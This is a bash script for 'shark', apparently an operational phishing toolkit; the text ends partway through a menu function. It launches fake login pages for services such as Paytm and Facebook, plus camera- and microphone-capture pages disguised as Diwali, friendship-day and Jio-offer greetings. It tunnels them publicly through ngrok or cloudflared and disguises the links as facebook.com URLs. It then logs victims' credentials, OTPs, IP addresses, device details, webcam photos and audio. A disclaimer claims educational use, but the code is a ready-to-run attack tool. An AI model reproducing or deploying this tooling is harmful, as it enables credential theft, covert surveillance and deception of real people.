#!/bin/bash

##############################################
#                                            #
#             PROJECT: J-SCRIPTING              #
#              SHARK ©2022-2023              #
#           BEST PHISHING TOOLS BY           #
#             J-SCRIPTING  (Contributor) #
#          J-SCRIPTING(Publisher)   #  
#         J-SCRIPTING (Author)    #
##############################################

#########
# COLORS
#########

#colors
white="\033[1;37m"                                          ##
grey="\033[0;37m"                                           ##
purple="\033[1;35m"                                         ##
red="\033[1;31m"                                            ##
green="\033[1;32m"                                          ##
yellow="\033[1;33m"                                         ##
purple="\033[0;35m"                                         ##
cyan="\033[0;36m"                                           ##
cyan1="\033[1;36m"                                          ##
cafe="\033[0;33m"                                           ##
fiuscha="\033[0;35m"                                        ##
blue="\033[1;34m"                                           ##
l_red="\033[1;37;41m"                                       ##
nc="\033[0m"                                                ##

##########
# VERSION
##########

VERSION="2.5.1"

################
# PRINT MESSAGE
################

msg() {
	printf "${green}[${white}+${green}] ${white}${1}\n${nc}"
}

norm_msg() {
	printf "${green}${1}\n${nc}"
}

error_msg() {
        printf "${red}[!] ${white}${1}\n${nc}"
}

ctrl-c_exit_SIGINT() {
    { printf "\n%s\n${red}[${white}!${red}]${red} Program Interrupted.\n\n" 2>&1; reset_color; }
    exit 0
}

ctrl-d_exit_SIGTERM() {
    { printf "\n%s\n${red}[${white}!${red}]${red} Program Terminated.\n\n" 2>&1; reset_color; }
      exit 0
}
trap ctrl-c_exit_SIGINT SIGINT
trap ctrl-d_exit_SIGTERM SIGTERM
reset_color() {
	tput sgr0   # reset attributes
	tput op     # reset color
    return
}
#######
# ARCH
#######

arch=`uname -m`
osnam=$(uname -o)
ArNam=$(dpkg --print-architecture)
#spinner
spinner() {
        pid=$!
        spin='\|/-'
        i=0
        tput civis
        while kill -0 $pid 2>/dev/null
	do
                i=$(( (i+1) %4 ))
                printf "\r${cyan1}[${spin:$i:1}]${nc} ${cyan1} $launch"
                sleep .1
	done
        printf "\r   ${green}[✔]${nc} ${green} $splashdown";echo
        tput cnorm
}

#check root
function check_root() {
        if [ "$(whoami &2>/dev/null)" != "root" ] && [ "$(id -un &2>/dev/null)" != "root" ];then 
                error_msg "Admin user detected\n"
                error_msg "You must be root to run this script!\n"
                error_msg "Use 'sudo !!'\n"
                exit 1
	fi
}


######
# USER
######


#####
# OS
#####

function os () {
	cat /etc/os-release > /dev/null 2>&1
        if [ "$?" -eq "0" ]; then
                BIN="/usr/bin"
	        phish="/usr/share/shark/phs"
		logfile="$phish/"
		#if logname = root then
		# user_id="$(logname)"
		files="$HOME/Desktop"
		shark="/usr/share/shark"
		old_shark="/usr/bin/shark"
		OS=DEBIAN
		check_root
	else
		BIN="${PREFIX}/bin"
		phish="${PREFIX}/share/shark/phs"
		logfile="$phish/"
		files="/sdcard"
		shark="${PREFIX}/share/shark"
                old_shark="${PREFIX}/bin/shark"
		OS=TERMUX
	fi
}

function main_update() {
	#launch="updating shark"
	#splashdown="updated shark";echo
	#os;(wget -q https://github.com/tech2gamer/shark/raw/Beta/shark -O ${shark}/shark && rm -rf ${old_shark} && cp -rf ${shark}/shark $BIN && chmod 777 $BIN/shark) & spinner
	echo
	msg "update manually by installation command\n ~(check Official shark repo)"
	sleep 2
	echo
	msg "Redirecting to Official shark repo..."
	xdg-open 'https://github.com/Bhaviktutorials/shark'
	exit 1
}


function update() {
	version=$(curl -L -s https://raw.githubusercontent.com/tech2gamer/shark/Beta/shark | grep -w "VERSION=" | head -n1)
	latest_version=$(echo ${version} | sed -e 's/[^0-9]\+[^0-9]/ /g' | cut -d '"' -f1)
	if [ "${1}" != "-u" ] || [ "${1}" != "--update" ]; then
		[ ${latest_version} != ${VERSION} ] && echo && msg "shark update is available !!" && sleep 2.5 && echo && msg "Run shark -u , shark --update" && echo && exit 1;	       
        fi
}

###########
# INTERNET
###########

#check ineternet connectivity for update
function internet() {
	ping -c 1 google.com > /dev/null 2>&1
        if [ $? -eq 0 -a ! "${1}" = "--update" ] && [ $? -eq 0 -a ! "$1" = "-u" ];then
                update
	fi
}


function connection() {
        ping -c 1 google.com > /dev/null 2>&1
        if [[ "$?" != 0 ]];then
                error_msg "No internet"
        exit 0
        fi
}

function check_update() {
        connection
        version=$(curl -L -s https://raw.githubusercontent.com/tech2gamer/shark/Beta/shark | grep -w "VERSION=" | head -n1)
	latest_version=$(echo ${version} | sed -e 's/[^0-9]\+[^0-9]/ /g' | cut -d '"' -f1)
        if [ ${latest_version} = ${VERSION} ];then
                echo -e "\tReading \tpackage \tlists... \tDone
                         \tBuilding \tdependency \ttree
                         \tReading \tstate \tinformation... \tDone
                         \tshark \tis \talready \tthe \tnewest \tversion \t($VERSION)." | awk '{$1=$1};1'
	        exit 1
	else
		main_update
		exit 1
	fi
}

########
# USAGE
########

usage() {
        cat <<EOF
Usage: $(basename $0) [OPTIONS] available
shark - future of phishing is here,
A shark is a tool that will help you \do Phishing \in an advanced way so no one checks and identify that you are doing phishing.
Options:
  -u, --update      update shark manually 
  -v, --version     Display the current shark version installed on your device
  -h, --help        Print this help message
  -a, --assist      List detail discription of shark
  -p, --purge       Uninstall shark
  --fix-ngrok       Fix port forwarding issue
  --fix-cloudfl     Fix CloudFlared port forwarding issue
  --fix-patches     Check missing packages & fix patches
  --fix-cloudshell  Restart Vm and cloudshell & fix patches
For additional info, see: https://github.com/Bhaviktutorials/shark
EOF
}

function purge_shark() {
        os;printf "${red} Do you wish to delete camera and audio files too ? y/n : ";read ans && [ "$ans" != "${ans#[Yy]}" ];rm -rf ${files}/Audio-Cam-hack.shark
        rm -rf ${shark} ${old_shark}
}

function fix_patches() {
        launch="fixing shark patches"
	splashdown="shark patches fixed";echo
	os;sed -i -e 's/\r$//' ${shark}/setup
	chmod 777 ${shark}/setup
        (${shark}/setup > /dev/null 2&>1) & spinner
}

function assist() {
        #put manpage in man dir later
	os
        man ${shark}/manpage
}
function fix_ngrok() {
	#check for all arch
	clear
	cd $HOME 
	os;rm -f ${BIN}/ngrok
	launch="fixing ngrok"
	splashdown="fixed ngrok";echo
	if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
			ngrok_url="https://github.com/tech2gamer/stuff/raw/main/ngrok-2in1.zip"
		elif [[ "$arch" == *'aarch64'* ]]; then
		         if [[ "$ArNam" == *'amd64'* ]]; then
                              ngrok_url="https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip"
                        else
                              ngrok_url="https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm64.zip"
		         fi
		elif [[ "$arch" == *'x86_64'* ]]; then
		         if [[ "$ArNam" == *'amd64'* ]]; then
                              ngrok_url="https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip"
                        else
                              ngrok_url="https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm64.zip"
		         fi
                else
			ngrok_url="https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip"
	fi
	(wget --quiet ${ngrok_url} -O ngrok.zip) & spinner
	unzip -q ngrok.zip && rm -rf ngrok.zip && chmod +x ngrok && mv ngrok $BIN
}

function fix_cloudflared() {
	clear
	cd $HOME
	os;rm -rf ${BIN}/cloudflared && rm -rf ${logfile}.cloud.log
	launch="fixing cloudflare.."
	splashdown="cloudflare fixed"
        if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
                        cloudd="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm"
                elif [[ "$arch" == *'aarch64'* ]]; then
                        cloudd="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64"
                elif [[ "$arch" == *'x86_64'* ]]; then
                        if [[ "$ArNam" == *'amd64'* ]]; then
                                cloudd="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"
                        else
                                cloudd="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64"
                        fi
                else
                        cloudd="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386"
         fi
	 (wget --quiet ${cloudd} -O cloudflared) & spinner
	 chmod +x cloudflared && mv cloudflared $BIN
}
function fix_cloudshell() {
	os;man ${shark}/cloudshell
}

###########
# OPTS ARG
###########

#getopts argument
while true; do
        case "$1" in
                -u|--update)
	                check_update
			;;

                -h|--help)
                        usage
                        exit 1
			;;

                -v|--version)
                        printf ".beta v$VERSION\n"
                        exit 1
                        ;;

		-p|--purge)
		        purge_shark
			exit 1
			;;

		-a|--assist)
			assist
			exit 1
			;;

		--fix-patches)
			fix_patches
			exit 1
			;;

		--fix-ngrok)
		        fix_ngrok
		        exit 1
			;;
		--fix-cloudfl)
			fix_cloudflared
			exit 1
			;;

		--fix-cloudshell)
		        fix_cloudshell
		        exit 1
			;;
                -*)
                        echo "ERROR: unknown option '$1'" 1>&2
                        echo "see '--help' for usage" 1>&2
                        exit 1
                        ;;

                *)
                        f=$1
                        break
                        ;;
	esac
        shift
done

##############
# MAIN DRIVER
##############

# CHECK FILE
file_check() {
        [ ! -d "${files}/Audio-Cam-hack.shark" ] && mkdir -p ${files}/Audio-Cam-hack.shark
}
#catch_ip camera
catch_ip() {
        ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
        IFS=$'\n'
        printf "${green}[${white}+${green}] ${yellow}IP:${white} %s ${nc} \n" $ip
        cat ip.txt >> saved.ip.txt
}

# KILL NGROK
function kill_session() {
        #kill_ngrok="$(ps -efw | grep ngrok | grep -v grep | awk '{print $2}')"
        #kill -9 ${kill_php} > /dev/null 2>&1
        #kill -9 ${kill_ngrok} > /dev/null 2>&1
	killall -KILL ngrok php cloudflared &>/dev/null
}

function url_checker() {
        if [ ! "${1//:*}" = http ]; then
	        if [ ! "${1//:*}" = https ]; then
			echo
                        printf "${red} Invalid URL. Please use http or https. \n "
                        exit 1
		fi
	fi
}

# URL_SHORTNER
function url_shortner() {
        rm -rf uri.log
	#short=$(curl -s http://tny.im/yourls-api.php?action=shorturl\&format=simple\&url=${ngrok_url})
	#short=$(curl -s https://vurl.com/api.php?url=${ngrok_url})
	derek=$(curl -s https://is.gd/create.php\?format\=simple\&url=${link})
        #checking for is.gd is working or not.
        if [[ $derek == https://is.gd/[-0-9a-zA-Z]* ]]; then
        shorter=${derek#https://}
        else
        #short=$(curl -s https://soo.gd/api.php?url=${link})
        curl -s https://api.shrtco.de/v2/shorten?url=${link} >> log.URI 
        grep -o 'https:[^"]*' log.URI >> bURI
        rm log.URI
        sed 's/\\//g' bURI >> uri.log
        rm bURI
        short=$(grep -o 'https://9qr.de/[-0-9a-zA-Z]*' "uri.log")
        shorter=${short#https://}
        fi
        read -p $'\n\033[1;92mshark \033[1;97m>> \033[1;37mMask Your url domain here \033[1;93m(Ex. https://facebook.com) :\e[0m ' mask
        url_checker $mask
	printf "${green}shark ${white}>> ${white}Enter your key words ${yellow}: Ex. free-insta-followers\n"
	printf "${green}shark ${white}>> ${white}Don't use space in your words\n"
        read -p $'\e[1;92mshark \033[1;97m>> \e[1;37mEnter your words here :\e[0m ' words
        final_url=$mask-$words@$shorter
	printf "$final_url\n"
}
# ASK FOR URL MODIFICATION
function askuri() {
	echo
	echo
	if [[ $link != "" ]]; then
	printf "${yellow}Your Link :-${cyan1} $link\n${yellow}
	  Do You Want To Modify This Url?${red} (Y/N) : ${nc}"
	read uri
	if [[ $uri == "Y" || $uri == "y" ]]; then
		url_shortner
	elif [[ $uri == "N" || $uri == "n" ]]; then
		echo
		final_url="You Haven't Modify URL!!!"

	else
                echo
		error_msg "bro you type wrong..."
		askuri
	fi
	else 
		clear
		echo
		printf "${red}Please Try again...Server Down!!!"
		sleep 2
                clear
		prt
	fi
}
# MAIN 
function main() {
HOST="127.0.0.1"
echo
read -p $'\e[1;32m\e[96m Do You want to enter port?\e[1;91m (Y/N): ' drk
if [[ $drk == y || $drk == Y ]]; then
echo ""
read -p $'\e[1;32m\e[96m Please Enter Your Port \e[1;92mEx.3246: \e[0m' PORT

if [[ -z "$PORT" ]]; then
echo
echo -e ${red}"Bro you didn't mentioned anything."
echo
echo -e ${green}"restarting your option No.$option...."
sleep 2
main
fi
if [[ $p == "s" ]]; then
main2
elif [[ $p == "S" ]]; then
launch="starting shark server"; splashdown="started shark server";printf "\n"; connection;php -S "$HOST":"$PORT" > /dev/null 2>&1 & sleep 2; ngrok http "$HOST":"$PORT" > /dev/null 2>&1 & sleep 20 & spinner;link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io");askuri;
else
final_url="Nothing to Modify localhost"
link="http://${HOST}:$PORT"

launch="starting shark server"; splashdown="started shark server";printf "\n"; connection; php -S "$HOST":"$PORT" &>/dev/null &
fi
elif [[ $drk == n || $drk == N ]]; then
PORT="8828"
if [[ $p == "s" ]]; then
echo
msg "Your Default Port is $PORT !${white} \n"
sleep 2
main2
elif [[ $p == "S" ]]; then
echo
msg "Your Default Port is $PORT !${white} \n"
sleep 2
launch="starting shark server"; splashdown="started shark server";printf "\n"; connection;php -S "$HOST":"$PORT" > /dev/null 2>&1 & sleep 2; ngrok http "$HOST":"$PORT" > /dev/null 2>&1 & sleep 20 & spinner;link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io");askuri;
else
final_url="Nothing to modify localhost."

link="http://${HOST}:$PORT"
launch="starting shark server"; splashdown="started shark server";printf "\n"; php -S "$HOST":"$PORT" &> /dev/null & 
fi

else
	echo
	error_msg "bro you type wrong..."
	sleep 2
	main
fi
}
function redirc() {
	if [ -f otp.login.php ]; then
		echo
		printf "${cyan}Are you going to use 2-step-verification [otp phish]? (Y/N) : "
		read stpver
		if [[ $stpver == "Y" || $stpver == "y" ]]; then
			echo
			FILE="${YOTPF}"
			OtP="0101010101"
			redrkask
		elif [[ $stpver == "N" || $stpver == "n" ]]; then
			oldy="otp.login.php"
			FILE="${NOTPF}"
			OtP="01010101"
			redrkask
		else
			echo
			error_msg "Somthing went wrong!!!"
			sleep 2
			exit 1
		fi
	else
		echo
	fi
}
function redrkask() {
	echo
printf "${yellow}${ysite}${cyan1} Redirect Option !!!\n${yellow}
          Do You Want To Redirect Url?${red} (Y/N) : ${nc}"
read ansm
if [[ $ansm == "N" || $ansm == "n" ]]; then
	echo
	msg "Your Redirect URL Is Set As Default (Google)"
	relink="https://google.com"
        rm -rf drk
	mkdir drk
	cp -R * drk &>/dev/null
	cd drk
        rm -rf drk/
	sed -i -e s,"$oldy","$relink",g $FILE
elif [[ $ansm == "y" || $ansm == "Y" ]]; then
        redrk
else
	echo
	error_msg "Somthing went wrong!!! try again!"
	sleep 2
	redrkask
fi
}
function redrk() {
	echo
        read -p $'\e[1;32m Enter URL To Redirect Victim ex.[https://yoursite.com]: \e[0m' relink
        url_checker $relink
	rm -rf drk/ 
	mkdir drk 
        cp -R * drk &>/dev/null
	cd drk
        rm -rf drk/
	sed -i -e s,"$oldy","$relink",g $FILE
}
function old() {
if [[ -e log.txt || -e dumpip.txt ]]; then
	rm -rf dumpip.txt filter.txt log.txt
fi
#if [[ -e log.txt ]]; then
#	rm -rf "usernames  log.txt" && touch log.txt
#	sed -i "1i <?php include 'ip.php'; ?>" index.*
#fi
}
function main2() {
if [[ -e ${logfile}.cloud.log ]]; then
	rm -rf ${logfile}.cloud.log
	touch ${logfile}.cloud.log
fi
if [[ `command -v termux-chroot` || "$osnam" == "Android" ]]; then
	launch="starting shark server"; splashdown="started shark server";printf "\n"; connection;php -S "$HOST":"$PORT" > /dev/null 2>&1 & sleep 2; termux-chroot cloudflared tunnel --url "$HOST":"$PORT" --logfile ${logfile}.cloud.log > /dev/null 2>&1 & sleep 5 & spinner;
else
	launch="starting shark server"; splashdown="started shark server";printf "\n"; connection;php -S "$HOST":"$PORT" > /dev/null 2>&1 & sleep 2; cloudflared tunnel --url "$HOST":"$PORT" --logfile ${logfile}.cloud.log  > /dev/null 2>&1 & sleep 5 & spinner;
fi
link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "${logfile}.cloud.log");askuri;
}
function prt() {
clear         
printf "
${red} 
░░░░░██╗░░░░░░██████╗░██╗░░██╗██╗░██████╗██╗░░██╗
░░░░░██║░░░░░░██╔══██╗██║░░██║██║██╔════╝██║░░██║
░░░░░██║█████╗██████╔╝███████║██║╚█████╗░███████║
██╗░░██║╚════╝██╔═══╝░██╔══██║██║░╚═══██╗██╔══██║
╚█████╔╝░░░░░░██║░░░░░██║░░██║██║██████╔╝██║░░██║
░╚════╝░░░░░░░╚═╝░░░░░╚═╝░░╚═╝╚═╝╚═════╝░╚═╝░░╚═╝
${nc}     
${yellow}     
${green}    
${blue}  
${purple}  ${yellow}.beta v${VERSION}\n\n"
printf "${red}[A]$cafe :${green} ngrok $cafe\e[0;33m[\e[0;31mGoogle Alert!\e[0;33m]

${red}[B]$cafe :${green} cloudflare $cafe\e[0;33m[\e[0;32mNEW!\e[0;33m]

${red}[D]$cafe :${green} localhost $cafe\e[0;33m[\e[0;34mFor Devs!\e[0;33m]
\n\n"
read -p $'\e[1;32m\e[94m Please enter your Option (A/B/D) : ' portfrd
if [[ $portfrd == "A" || $portfrd == "a" || $portfrd == "ngrok" ]]; then
	p="S" 
	if [ -e ${BIN}/ngrok ];then
		echo
                   msg "ngrok is already installed."
               if [[ ! -e $HOME/.ngrok2 ]]; then
		     echo ""
		      read -p $'\e[1;33m Please Enter Your ngrok authtoken without "./"\n\n\e[0m./' auth
		 
                           if [[ -z $auth  ]]; then
			    
			      echo ""
			      error_msg "it seems quit empty try again!"
			      sleep 4
			      prt
		           else 
			      $auth 
			      clear  
			      msg "Authtoken Verified."
			      sleep 2
			      prt
		           fi
                    
	 else
		     echo ""
		      msg "Authtoken Verified."
		      sleep 3
	 fi
	        sleep 1
		if [[ $valu != "19" ]]; then
			if [[ $reddc == "TRUE" ]];then
				redrkask
				main
			else
				redirc
				main
			fi

		else
			main
		fi
	else 
		echo
		error_msg " ngrok is not install yet!"
		sleep 2
                echo ""
		msg "Preparing fix's ...\n"
		sleep 5
		fix_ngrok
		decne
		
	fi

elif [[ $portfrd == "b" || $portfrd == "B" || $portfrd == "cloudflare" ]]; then
	p="s"
	if [ -e ${BIN}/cloudflared ]; then
		echo
		msg " cloudflare is already installed."
		sleep 1
		if [[ $valu != "19" ]]; then
			if [[ $reddc == "TRUE" ]]; then
				redrkask
				main
			else
				redirc
				main
			fi

		else
			main
		fi
	else
		echo
		error_msg " cloudflare is not installed yet!\n"
		sleep 2
		msg "Preparing fix's ...\n"
		sleep 5
		echo
		fix_cloudflared
		decne
	fi 
elif [[ $portfrd == "D" || $portfrd == "d" || $portfrd == "localhost" ]];then
	p="d"
	redirc
	old
	main
	credentials && ipinfo
else
        echo
	echo
        error_msg "bro you type wrong...\n"
        error_msg "try again!!\n"
	sleep 3
	prt
fi

}

function ipcatch() {
ip=$( egrep '(([0-9a-fA-F]{1,4}:){7,7}[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,7}:|([0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,5}(:[0-9a-fA-F]{1,4}){1,2}|([0-9a-fA-F]{1,4}:){1,4}(:[0-9a-fA-F]{1,4}){1,3}|([0-9a-fA-F]{1,4}:){1,3}(:[0-9a-fA-F]{1,4}){1,4}|([0-9a-fA-F]{1,4}:){1,2}(:[0-9a-fA-F]{1,4}){1,5}|[0-9a-fA-F]{1,4}:((:[0-9a-fA-F]{1,4}){1,6})|:((:[0-9a-fA-F]{1,4}){1,7}|:)|fe80:(:[0-9a-fA-F]{0,4}){0,4}%[0-9a-zA-Z]{1,}|::(ffff(:0{1,4}){0,1}:){0,1}((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9]).){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])|([0-9a-fA-F]{1,4}:){1,4}:((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9]).){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9]))'  dumpip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
KL=$(sed -n 's/ip://p' dumpip.txt)
ua=$(grep 'User-Agent:' dumpip.txt | cut -d '"' -f2)
if [[ $KL != "" ]]; then
printf "${yellow}[${green}•${yellow}] ${cyan1}Device IP : ${nc}$KL\n\n"
fi
echo -e "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] UA: \e[0m$ua\e[0m\e[1;77m\e[0m\n"
chk=$(fmt -20 dumpip.txt)
sch=$(echo "$chk" > filter.txt)
D=$(sed -n '5p' filter.txt | cut -d"(" -f2 | cut -d";" -f1)
E=$(sed -n '6p' filter.txt | cut -d"(" -f2 | cut -d";" -f1)
R=$(sed -n '7p' filter.txt | cut -d";" -f2 | cut -d")" -f1)
E=$(sed -n '11p' filter.txt | cut -d "/" -f1)
K=$(sed -n '11p' filter.txt | cut -d " " -f2 | cut -d"/" -f2)
U=$(sed -n '12p' filter.txt | cut -d"(" -f2 | cut -d")" -f1)
echo -e "\e[1;92m[\e[0m\e[1;34m•\e[0m\e[1;92m] Kernel:\e[1;0m $D\e[0m"
echo -e "\e[1;92m[\e[0m\e[1;34m•\e[0m\e[1;92m] Os:\e[1;0m $E\e[0m"
echo -e "\e[1;92m[\e[0m\e[1;34m•\e[0m\e[1;92m] Model:\e[1;0m $R\e[0m"
echo -e "\e[1;92m[\e[0m\e[1;34m•\e[0m\e[1;92m] Browser:\e[0m $E\e[0m"
echo -e "\e[1;92m[\e[0m\e[1;34m•\e[0m\e[1;92m] Version:\e[1;0m $K\e[0m"
echo -e "\e[1;92m[\e[0m\e[1;34m•\e[0m\e[1;92m] Device:\e[1;0m $U"
cat dumpip.txt >> ../.ipdump.txt
echo "$KL" >> ../.dumplog.txt
rm -rf dumpip.txt filter.txt
echo ""
msg "Waiting for Victim's files or Credentials..."
}
snt() {
	if [[ "$option" == "31" ]]; then
		echo -e "\e[1;92m[\e[0m\e[1;34m¤\e[0m\e[1;92m] Cam File Received!"
		mv *.png ${files}/Audio-Cam-hack.shark/
	fi
	if [[ "$option" == "32" ]]; then
		echo -e "\e[1;92m[\e[0m\e[1;34m¤\e[0m\e[1;92m] Audio File Received!"
		ffmpeg -i *.wav -acodec mp3 *.mp3 &> /dev/null
		mv *.mp3 ${files}/Audio-Cam-hack.shark/
		echo ""
		echo -e "\e[1;92m[\e[0m\e[1;34m+\e[0m\e[1;92m] Command To play audio:- play <path-to-file.mp3>\n"
	fi
}
function ipinfo() {
	echo
	if [[ -e ../.dumplog.txt ]]; then
		CRD1=$(cat ../.dumplog.txt)
		msg "Your Old Credentials :\n$CRD1\n"
	fi
        printf "${yellow}[•]  Waiting for Victim's Device info...\n\n"
        while true; do
		if [[ -f "dumpip.txt"  ]]; then
			echo ''
			msg "Victim's I.P  F O U N D "
			echo ''
			printf "${green}[*] Info Found\n\n"
			sleep 0.75
			ipcatch
		fi
	        if [[ -e "log.txt" ]]; then
		       echo ''
		       msg "Victim's Credentials Found."
		       CRD=$(cat log.txt)
		       echo -e "\e[1;92m[\e[0m\e[1;34m•\e[0m\e[1;92m] Credentials: $CRD"
		       cat log.txt >> ../.dumplog.txt
          	       rm -rf log.txt
		       echo ""
		       msg "Waiting for next Device, press CTRL + C for exit..."
		fi
		if [[ -e "Log.log" ]]; then
			rm Log.log
			echo ""
			snt
			echo ""
			echo -e "\e[1;92m[\e[0m\e[1;34m•\e[0m\e[1;92m] File Location : ${files}/Audio-Cam-hack.shark"
			echo ""
			msg "Waiting for next file, press CTRL + C for exit..."
		fi
        done
}
#banner2
banner2() {
	printf "\n${green}
        ╔════════════════════════════════════╗
        ║${white}   ╔═╗┬─┐┌─┐┌┬┐┌─┐┌┐┌┌┬┐┬┌─┐┬  ┌─┐${green}  ║
        ║${white}   ║  ├┬┘├┤  ││├┤ │││ │ │├─┤│  └─┐${green}  ║
        ║${white}   ╚═╝┴└─└─┘─┴┘└─┘┘└┘ ┴ ┴┴ ┴┴─┘└─┘${green}  ║
        ╚════════════════════════════════════╝
                
        Shark beta : ${white}v${VERSION}${green}
        Reborn by  : ${white}J-SCRIPTING(E343IO)${green} •
         Publisher : ${white}J-SCRIPTING${green}       •
	    Author : ${white}J-SCRIPTING${red}     • 
            ${yellow}Note   : help us by giving your feedback

        》 ${cyan1}${final_url}${yellow} 《 MODIFIED URL.
                	or
        》 ${cyan1}${link}${yellow} 《 ORIGINAL URL.\n
\e[38;5;214m ░▒▓█ ░▒▓█▓▒░▒▓█▓▒░▒▓\e[1;34m░▒▓█ ░▒▓█▓▒░▒▓█▓▒░▒▓\e[1;92m░▒▓█ ░▒▓█▓▒░▒▓█▓▒░▒▓${cyan1}\n\n"
}

#credentials
function credentials() {
	clear
	banner2

}

#Paytm
function paytm() {
          printf "\n${green}[${white}1${green}]${white} Sign In \n\n"
          printf "${green}[${white}2${green}]${white} Sign Up \n\n"
          read -p $'\e[1;92mshark \e[1;37m>> Enter Your Choice : \e[0m' option1
          if [ $option1 = 1 ] || [ $option1 = 01 ]; then
		   cd paytm/ && prt
		   credentials
                   tail -f log.txt ip.txt | grep -e "email" -e "username" -e "password" -e "otp"
	  else
                   cd signup/ && prt
		   credentials
		   tail -f log.txt ip.txt | grep -e "email" -e "loginPassword" -e "mobileNumber" -e "otp"
	  fi
}

#CAMERA HACK
function camera_hack() {
        clear
        printf "\n\e[1;4;92mChoose Your Tempelates\e[0m\n\n"
        printf "${green}[${white}1${green}]${white} Diwali \n\n";printf "${green}[${white}2${green}]${white} Freindship Dare \n\n";printf "${green}[${white}3${green}]${white} Freindship Day \n\n";printf "${green}[${white}4${green}]${white} New Year \n\n";printf "${green}[${white}5${green}]${white} Jio Offfer \n\n"
        read -p $'\e[1;92mshark\e[1;37m >>\e[0m ' page
        #link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
	case $page in

                1)
                        source="diwali.html"
                        ;;

                2)
                        source="freindship_dare.html"
                        ;;

                3)
                        source="freinship_day.html"
                        ;;

                4)
                        source="happy_new_year.html"
                        ;;

                5)
                        source="jio_offer.html"
                        ;;
		esac
# link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                old && rm -rf .drk/
		mkdir .drk/
		cp -R * .drk/
		cd .drk/ && rm -rf .drk/
                prt
		sed 's+forwarding_link+'$link'+g' ${source} > index2.html;sed 's+forwarding_link+'$link'+g' template.php > index.php
		credentials
			sleep 0.5
			ipinfo
}

# Voice Hack

function audio_hack() {
	old && rm -rf .drk/
	mkdir .drk
	cp -R * .drk/
	cd .drk/ && rm -rf .drk/
	default_redirect="https://google.com"
        printf "\n${green}[${white}+${green}] Choose a distracting website ${white}(Default: https://google.com) : " $default_redirect && read redirect_link
        redirect_link="${redirect_link:-${default_redirect}}";
        sed 's+forwarding_link+'$link'+g' template.php > index.php;sed 's+redirect_link+'$redirect_link'+g' js/_app.js > js/app.js

                #cat index2.html >> index.php
	        prt && credentials
	        sleep 0.5
		ipinfo
}
decne() {
	if [[ $valu == "19" ]]; then
		echo 
		msg "Don't worry will soon provide a stable feature for this.\n\n"
		sleep 7
		prt 
		credentials
		tail -f log.txt
		break;
	else
		if [[ $p != "d" ]]; then
			old
			prt && credentials
			ipinfo
			break;
		elif [[ $p == "d" ]]; then
			prt
			break;
		else 
			echo 
			error_msg "somthing went wrong!! pls try again!!\n"
		fi
	fi
}
msgsh() {
if [[ ! -e "${logfile}.sharkmsg" ]]; then
	clear
	msg "You Are Using Shark Beta .v$VERSION\n"
	sleep 2
	msg "Give us your feedback and idea's.\r• if you are facing any kind of error then let us know\n"
	msg "Getting Things Ready... Please wait.\n\n"
	sleep 5
	clear
	printf "                           ${red}|===========================|
	                  [¤]   \e[1;33mD I S C L A I M E R${red}   [¤]
	                   |===========================|\n\n"
	error_msg "\e[1;32m• This tool you are going to use at your risk,\n\n• Developers and Publisher of Shark are not responsible for any kind hack and stuff.\n\n• shark is a open source tool that help us to know how phishing works\n\n• Phishing is illigal if you are using as offensive\n\n• The use of the SHARK & its resources/phishing-pages is COMPLETE RESPONSIBILITY of the END-USER.
Developers assume NO liability and are NOT responsible for any damage caused by this program.
Also we want to inform you that some of your actions may be ILLEGAL and you CAN NOT use this
software to test device, company or any other type of target without WRITTEN PERMISSION from them.\n\n"
msg "Give us your feedback on telegram chat grp:- https://t.me/bhaviktutorial\n"

read -p $'\e[1;40m\e[1;92m T O  R U N  S H A R K  A C C E P T  D I S C L A I M E R\e[1;93m (Y/N) : \e[0m' shmsg

if [[ $shmsg == "Y" || $shmsg == "y" || $shmsg == "yes" ]]; then
		cd ${phish}
		touch .sharkmsg
		echo "You Accepted EULA" >> .sharkmsg
		echo ""
		msg "You Accepted EULA"
		sleep 3
		cd ~
	elif [[ $shmsg == "N" || $shmsg == "n" || $shmsg == "no" ]]; then
		clear
		echo 
		error_msg "You Haven't Accepted!!\n"
		exit 1
	else 
		echo
		clear
		error_msg "Typing error, try again!!...\n"
		exit 1
	fi
else
	echo
fi
}
FC_OPT() {
echo ""
printf "${green}[${nc}01${green}]${yellow} Traditional Login Page\n\n"
printf "${green}[${nc}02${green}]${yellow} Advanced Voting Poll Login Page\n\n"
printf "${green}[${nc}03${green}]${yellow} Fake Security Login Page\n\n"
printf "${green}[${nc}04${green}]${yellow} Facebook Messenger Login Page\n\n"
read -p $'\e[1;32m[\e[0m-\e[1;32m]\e[1;33m Select an option : \e[1;36m' pgrep
case $pgrep in 
		1 | 01) 
			cd ${phish}/facebook/
			reddc="TRUE"
